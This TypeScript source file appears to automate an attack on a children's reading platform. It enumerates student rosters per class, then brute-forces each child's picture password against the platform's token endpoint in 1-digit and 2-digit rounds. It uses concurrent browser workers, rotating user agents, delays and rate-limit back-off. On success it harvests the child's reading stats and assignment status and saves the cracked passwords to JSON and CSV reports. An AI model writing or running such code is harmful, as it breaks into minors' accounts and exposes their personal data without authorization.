import * as fs from 'fs';
import * as path from 'path';
import { chromium, Browser, BrowserContext, Page } from 'playwright';
import { BASE_URL, VALID_CLASSES, Student, ClassStudents, ProbeResult, ProbeProgress, StudentProbeState, ProbeConfig } from './types';
import { generateCombinations, combinationToNames } from './combinations';

const DATA_DIR = path.join(process.cwd(), 'data');
const PROBE_DATA_DIR = path.join(DATA_DIR, 'probe');
const STUDENTS_FILE = path.join(PROBE_DATA_DIR, 'all-class-students.json');
const RESULTS_FILE = path.join(PROBE_DATA_DIR, 'probe-results.json');
const PROGRESS_FILE = path.join(PROBE_DATA_DIR, 'probe-progress.json');
const FAILED_FILE = path.join(PROBE_DATA_DIR, 'probe-failed.json');

function ensureDir(dir: string) {
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
}

function sleep(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function randomDelay(min: number, max: number): Promise<void> {
  const delay = min + Math.random() * (max - min);
  return sleep(delay);
}

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
];

function randomUserAgent(): string {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

interface ApiProbeResult {
  status: number;
  accessGranted?: boolean;
  stars?: number;
  rateLimitRemaining?: number;
  error?: string;
}

export class StudentFetcher {
  async fetchAllClasses(): Promise<ClassStudents[]> {
    console.log('\n[StudentFetcher] Fetching student lists for all classes...\n');
    ensureDir(PROBE_DATA_DIR);

    const browser = await chromium.launch({
      headless: false,
      args: ['--no-sandbox', '--disable-setuid-sandbox']
    });

    const context = await browser.newContext({
      userAgent: randomUserAgent(),
      viewport: { width: 1280, height: 800 }
    });

    const page = await context.newPage();

    try {
      await page.goto(`${BASE_URL}/ng/`);
      await page.waitForTimeout(3000);

      const inputSelector = 'input[type="text"], input[name="username"], input[placeholder*="username" i], input[placeholder*="teacher" i]';
      await page.waitForSelector(inputSelector, { timeout: 15000 });
      await page.fill(inputSelector, VALID_CLASSES[0]);
      await page.keyboard.press('Enter');
      await page.waitForTimeout(4000);

      const results: ClassStudents[] = [];

      for (const className of VALID_CLASSES) {
        console.log(`  Fetching ${className}...`);
        const classData = await this.fetchClass(page, className);
        if (classData) {
          results.push(classData);
          console.log(`  ${className}: ${classData.students.length} students`);
        } else {
          console.log(`  ${className}: FAILED`);
        }
        await randomDelay(1000, 2000);
      }

      await browser.close();

      fs.writeFileSync(STUDENTS_FILE, JSON.stringify(results, null, 2));
      console.log(`\n  Saved to: ${STUDENTS_FILE}`);
      console.log(`  Total: ${results.reduce((sum, c) => sum + c.students.length, 0)} students across ${results.length} classes`);

      return results;
    } catch (error) {
      await browser.close();
      throw error;
    }
  }

  private async fetchClass(page: Page, className: string): Promise<ClassStudents | null> {
    try {
      let classrooms: any[] = [];
      try {
        const resp = await page.request.post(`${BASE_URL}/ng/api/kids/member/classrooms`, {
          data: { username: className }
        });
        classrooms = await resp.json();
      } catch (e) {
        console.log(`    Failed to get classrooms: ${e}`);
        return null;
      }

      if (!classrooms || classrooms.length === 0) {
        return null;
      }

      const classroom = classrooms[0];

      let students: Student[] = [];
      try {
        const resp = await page.request.post(`${BASE_URL}/ng/api/kids/member/class-chart`, {
          data: { username: className, classroomId: classroom.classroomId }
        });
        students = await resp.json();
      } catch (e) {
        console.log(`    Failed to get students: ${e}`);
        return null;
      }

      return {
        className,
        classroomId: classroom.classroomId,
        memberId: classroom.memberId,
        fetchedAt: new Date().toISOString(),
        students
      };
    } catch (error) {
      console.log(`    Error: ${error}`);
      return null;
    }
  }
}

export class PasswordProber {
  private config: ProbeConfig;
  private results: ProbeResult[] = [];
  private progress: ProbeProgress | null = null;
  private failedRecords: Array<{ className: string; studentId: number; screenName: string; round: number; reason: string; timestamp: string }> = [];

  constructor(config?: Partial<ProbeConfig>) {
    this.config = {
      maxConcurrency: config?.maxConcurrency ?? 3,
      minDelay: config?.minDelay ?? 500,
      maxDelay: config?.maxDelay ?? 1000,
      headless: config?.headless ?? false,
      rounds: config?.rounds ?? [1, 2],
      resumeFromFile: config?.resumeFromFile ?? true,
    };
  }

  async run(allClassStudents: ClassStudents[]): Promise<void> {
    console.log('\n[PasswordProber] Starting API-based password probe...\n');
    ensureDir(PROBE_DATA_DIR);

    this.loadExistingData();

    const allStudents: StudentProbeState[] = [];
    for (const cls of allClassStudents) {
      for (const student of cls.students) {
        const existing = this.progress?.studentStates.find(
          s => s.className === cls.className && s.studentId === student.studentId
        );
        if (existing && existing.status === 'success') {
          allStudents.push(existing);
        } else {
          allStudents.push({
            className: cls.className,
            studentId: student.studentId,
            screenName: student.screenName,
            status: 'pending',
            probeAttempts: 0,
          });
        }
      }
    }

    this.progress = {
      startedAt: this.progress?.startedAt || new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      currentRound: 1,
      totalStudents: allStudents.length,
      successCount: allStudents.filter(s => s.status === 'success').length,
      failedCount: 0,
      pendingCount: allStudents.filter(s => s.status === 'pending').length,
      studentStates: allStudents,
    };

    this.saveProgress();

    for (const round of this.config.rounds) {
      const roundLabel = round === 1 ? '1-digit' : '2-digit';
      const targetStatus = round === 1 ? 'pending' : 'failed_1digit';

      const studentsToProbe = this.progress.studentStates.filter(s => s.status === targetStatus);

      if (studentsToProbe.length === 0) {
        console.log(`\n  Round ${round} (${roundLabel}): No students to probe, skipping.`);
        continue;
      }

      this.progress.currentRound = round as 1 | 2;
      this.saveProgress();

      const comboCount = generateCombinations(round as 1 | 2).length;

      console.log(`\n${'='.repeat(60)}`);
      console.log(`  Round ${round}: ${roundLabel} password probe (API mode)`);
      console.log(`  Students to probe: ${studentsToProbe.length}`);
      console.log(`  Combinations per student: ${comboCount}`);
      console.log(`  Concurrency: ${this.config.maxConcurrency}`);
      console.log(`${'='.repeat(60)}\n`);

      await this.runRound(round as 1 | 2, studentsToProbe, allClassStudents);
    }

    this.generateReport();
  }

  private async runRound(round: 1 | 2, students: StudentProbeState[], allClassStudents: ClassStudents[]): Promise<void> {
    const combinations = generateCombinations(round);
    const concurrency = this.config.maxConcurrency;

    const classMap = new Map<string, ClassStudents>();
    for (const cls of allClassStudents) {
      classMap.set(cls.className, cls);
    }

    const queue = [...students];
    const workers: Promise<void>[] = [];

    for (let w = 0; w < concurrency; w++) {
      workers.push(this.worker(w, queue, combinations, round, classMap));
    }

    await Promise.all(workers);
  }

  private async worker(
    workerId: number,
    queue: StudentProbeState[],
    combinations: number[][],
    round: 1 | 2,
    classMap: Map<string, ClassStudents>
  ): Promise<void> {
    let browser: Browser | null = null;
    let context: BrowserContext | null = null;
    let page: Page | null = null;

    try {
      browser = await chromium.launch({
        headless: this.config.headless,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
      });

      context = await browser.newContext({
        userAgent: randomUserAgent(),
        viewport: { width: 1280, height: 800 }
      });

      page = await context.newPage();

      await page.goto(`${BASE_URL}/ng/`);
      await page.waitForTimeout(3000);

      const inputSelector = 'input[type="text"], input[name="username"], input[placeholder*="username" i], input[placeholder*="teacher" i]';
      await page.waitForSelector(inputSelector, { timeout: 15000 });
      await page.fill(inputSelector, VALID_CLASSES[0]);
      await page.keyboard.press('Enter');
      await page.waitForTimeout(4000);

      console.log(`  [W${workerId}] Browser ready`);

      while (queue.length > 0) {
        const student = queue.shift();
        if (!student) break;

        const classData = classMap.get(student.className);
        if (!classData) {
          console.log(`  [W${workerId}] No class data for ${student.className}, skipping ${student.screenName}`);
          continue;
        }

        console.log(`  [W${workerId}] Probing ${student.className}/${student.screenName} (${round}-digit)...`);

        const result = await this.probeStudentApi(page!, student, combinations, round, classData);

        if (result) {
          this.results.push(result);
          student.status = 'success';
          student.passwordFound = result.passwordCombination;
          student.passwordNames = result.passwordNames;
          student.probeAttempts = result.probeAttempts;
          student.lastProbeAt = result.probeTimestamp;
          this.progress!.successCount++;
        } else {
          student.probeAttempts += combinations.length;
          student.lastProbeAt = new Date().toISOString();
          if (round === 1) {
            student.status = 'failed_1digit';
          } else {
            student.status = 'failed_all';
          }
          this.progress!.failedCount++;
        }

        this.progress!.pendingCount = this.progress!.studentStates.filter(
          s => s.status === 'pending' || s.status === 'failed_1digit'
        ).length;
        this.progress!.updatedAt = new Date().toISOString();
        this.saveProgress();
        this.saveResults();

        await randomDelay(this.config.minDelay, this.config.maxDelay);
      }

    } catch (error) {
      console.error(`  [W${workerId}] Worker error:`, error);
    } finally {
      if (page) await page.close().catch(() => {});
      if (context) await context.close().catch(() => {});
      if (browser) await browser.close().catch(() => {});
    }
  }

  private async probeStudentApi(
    page: Page,
    studentState: StudentProbeState,
    combinations: number[][],
    round: 1 | 2,
    classData: ClassStudents
  ): Promise<ProbeResult | null> {
    let rateLimitRemaining = 10;

    for (let comboIdx = 0; comboIdx < combinations.length; comboIdx++) {
      const combo = combinations[comboIdx];

      if (rateLimitRemaining <= 2) {
        console.log(`    Rate limit low (${rateLimitRemaining}), waiting 3s...`);
        await sleep(3000);
        rateLimitRemaining = 10;
      }

      try {
        const apiResult: ApiProbeResult = await page.evaluate(async (data: {
          studentId: number;
          username: string;
          iconicPassword: number[];
        }) => {
          try {
            const response = await fetch('/ng/api/kids/tokens', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(data),
              credentials: 'include'
            });

            const remaining = parseInt(response.headers.get('x-ratelimit-remaining') || '10', 10);

            const text = await response.text();
            let jsonData: any = null;
            try { jsonData = JSON.parse(text); } catch {}

            return {
              status: response.status,
              accessGranted: jsonData?.state?.accessGranted,
              stars: jsonData?.state?.user?.stars?.earnedStars,
              rateLimitRemaining: remaining,
            };
          } catch (e: any) {
            return { error: e.message, rateLimitRemaining: 10 };
          }
        }, {
          studentId: studentState.studentId,
          username: studentState.className,
          iconicPassword: combo
        });

        rateLimitRemaining = apiResult.rateLimitRemaining ?? 10;

        if (apiResult.status === 429) {
          console.log(`    Rate limited, waiting 5s...`);
          await sleep(5000);
          comboIdx--;
          continue;
        }

        if (apiResult.accessGranted === true) {
          console.log(`    SUCCESS! ${studentState.screenName} password: [${combo.join(',')}] = ${combinationToNames(combo).join('-')}`);

          let readingStats: any = null;
          let assignmentStatus: any = null;

          try {
            const statsResult = await page.evaluate(async () => {
              try {
                const resp = await fetch('/ng/api/kids/student/stats/primary-reading', { credentials: 'include' });
                const text = await resp.text();
                if (text.startsWith('{')) return JSON.parse(text);
                return null;
              } catch { return null; }
            });
            readingStats = statsResult;
          } catch {}

          try {
            const assignResult = await page.evaluate(async () => {
              try {
                const resp = await fetch('/ng/api/kids/student/reading/assignment/self-paced/status', { credentials: 'include' });
                const text = await resp.text();
                if (text.startsWith('{')) return JSON.parse(text);
                return null;
              } catch { return null; }
            });
            assignmentStatus = assignResult;
          } catch {}

          try {
            await page.evaluate(async () => {
              try {
                await fetch('/ng/api/kids/tokens/sign-out', { credentials: 'include' });
              } catch {}
            });
          } catch {}

          return {
            className: studentState.className,
            studentId: studentState.studentId,
            screenName: studentState.screenName,
            passwordCombination: combo,
            passwordNames: combinationToNames(combo),
            loginStatus: 'success',
            earnedStars: apiResult.stars,
            readingStats: readingStats ? {
              readThisWeekCount: readingStats.readThisWeekCount,
              readLastWeekCount: readingStats.readLastWeekCount,
              listenCount: readingStats.listenCount,
              readCount: readingStats.readCount,
              quizCount: readingStats.quizCount,
              worksheetCount: readingStats.worksheetCount,
            } : undefined,
            assignmentStatus: assignmentStatus ? {
              currentLevel: assignmentStatus.currentLevel?.name,
              completedTasks: assignmentStatus.completedTasks,
              remainingTasks: assignmentStatus.remainingTasks,
              nextLevel: assignmentStatus.nextLevel?.name,
            } : undefined,
            probeTimestamp: new Date().toISOString(),
            probeAttempts: comboIdx + 1,
          };
        }

      } catch (e) {
        console.log(`    Error at combo ${comboIdx}: ${e}`);
        await sleep(1000);
      }

      if (comboIdx > 0 && comboIdx % 20 === 0) {
        console.log(`    ${studentState.screenName}: tried ${comboIdx}/${combinations.length} combos...`);
      }

      await sleep(200 + Math.random() * 300);
    }

    this.failedRecords.push({
      className: studentState.className,
      studentId: studentState.studentId,
      screenName: studentState.screenName,
      round,
      reason: `All ${combinations.length} ${round}-digit combinations failed`,
      timestamp: new Date().toISOString(),
    });

    return null;
  }

  private loadExistingData(): void {
    if (!this.config.resumeFromFile) return;

    try {
      if (fs.existsSync(RESULTS_FILE)) {
        const data = JSON.parse(fs.readFileSync(RESULTS_FILE, 'utf-8'));
        this.results = Array.isArray(data) ? data : [];
        console.log(`  Loaded ${this.results.length} existing results`);
      }
    } catch {}

    try {
      if (fs.existsSync(PROGRESS_FILE)) {
        this.progress = JSON.parse(fs.readFileSync(PROGRESS_FILE, 'utf-8'));
        console.log(`  Loaded progress: ${this.progress?.successCount} success, ${this.progress?.pendingCount} pending`);
      }
    } catch {}

    try {
      if (fs.existsSync(FAILED_FILE)) {
        const data = JSON.parse(fs.readFileSync(FAILED_FILE, 'utf-8'));
        this.failedRecords = Array.isArray(data) ? data : [];
      }
    } catch {}
  }

  private saveProgress(): void {
    ensureDir(PROBE_DATA_DIR);
    fs.writeFileSync(PROGRESS_FILE, JSON.stringify(this.progress, null, 2));
  }

  private saveResults(): void {
    ensureDir(PROBE_DATA_DIR);
    fs.writeFileSync(RESULTS_FILE, JSON.stringify(this.results, null, 2));
    fs.writeFileSync(FAILED_FILE, JSON.stringify(this.failedRecords, null, 2));
  }

  private generateReport(): void {
    ensureDir(PROBE_DATA_DIR);

    const reportFile = path.join(PROBE_DATA_DIR, 'probe-report.txt');
    const csvFile = path.join(PROBE_DATA_DIR, 'probe-results.csv');

    const lines: string[] = [];
    lines.push('========================================');
    lines.push('  Password Probe Report');
    lines.push('========================================');
    lines.push(`  Generated: ${new Date().toISOString()}`);
    lines.push(`  Total students: ${this.progress?.totalStudents}`);
    lines.push(`  Success: ${this.progress?.successCount}`);
    lines.push(`  Failed: ${this.progress?.failedCount}`);
    lines.push(`  Pending: ${this.progress?.pendingCount}`);
    lines.push('');

    if (this.results.length > 0) {
      lines.push('--- Successful Probes ---');
      for (const r of this.results) {
        lines.push(`  ${r.className}/${r.screenName}: [${r.passwordCombination.join(',')}] = ${r.passwordNames.join('-')} (stars: ${r.earnedStars ?? 'N/A'})`);
      }
    }

    if (this.failedRecords.length > 0) {
      lines.push('');
      lines.push('--- Failed Probes ---');
      for (const f of this.failedRecords) {
        lines.push(`  ${f.className}/${f.screenName}: ${f.reason}`);
      }
    }

    fs.writeFileSync(reportFile, lines.join('\n'));
    console.log(`\n  Report saved: ${reportFile}`);

    if (this.results.length > 0) {
      const csvLines = ['className,studentId,screenName,password,passwordNames,earnedStars,probeAttempts,timestamp'];
      for (const r of this.results) {
        csvLines.push(`${r.className},${r.studentId},${r.screenName},"${r.passwordCombination.join('-')}","${r.passwordNames.join('-')}",${r.earnedStars ?? ''},${r.probeAttempts},${r.probeTimestamp}`);
      }
      fs.writeFileSync(csvFile, csvLines.join('\n'));
      console.log(`  CSV saved: ${csvFile}`);
    }
  }
}
